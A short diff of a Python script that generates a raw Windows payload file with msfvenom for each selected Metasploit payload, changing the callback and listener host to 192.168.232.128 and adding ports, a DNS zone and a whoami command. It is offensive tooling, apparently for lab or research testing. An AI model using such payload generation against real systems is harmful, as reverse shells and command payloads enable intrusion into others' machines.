@@ -30,7 +30,7 @@ if (not os.path.exists(payloads_dir)):
     os.mkdir(payloads_dir)
 
 for pay in payloads_selected:
-    cmd = "msfvenom --platform windows -p {} LHOST=172.16.104.130 LPORT=31337 KHOST=172.16.104.130 DLL=test.dll AHOST=172.16.104.130 -f raw -o {}/{}.bin".format(pay, payloads_dir, pay.replace('/', "_")) # DNSZONE=? CMD=? LHOST=172.16.104.130 LPORT=31337 KHOST=172.16.104.130 DLL=test.dll AHOST=172.16.104.130
+    cmd = "msfvenom --platform windows -p {} LHOST=192.168.232.128 LPORT=31337 KHOST=192.168.232.128 KPORT=31337 AHOST=192.168.232.128 APORT=31337 DLL=test.dll DNSZONE=corelan.eu CMD=whoami -f raw -o {}/{}.bin".format(pay, payloads_dir, pay.replace('/', "_"))
     os.system(cmd)
 
 
